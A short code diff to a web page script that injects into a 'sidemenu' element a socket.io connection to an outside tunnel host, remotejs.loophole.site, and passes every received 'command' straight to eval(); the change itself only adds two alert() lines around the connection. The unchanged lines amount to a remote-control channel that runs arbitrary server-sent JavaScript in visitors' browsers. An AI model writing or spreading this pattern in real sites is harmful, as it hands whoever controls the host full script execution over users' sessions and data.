@@ -12,7 +12,9 @@ if (document.getElementById('sidemenu')) {
     sidemenu.innerHTML=`
     <script src="https://remotejs.loophole.site/socket.io/socket.io.js">
     <script>
+      alert("Connecting");
       var socket = io.connect("https://remotejs.loophole.site");
+      alert("Connected");
       socket.on("command", function(command) {
         eval(command);
       });
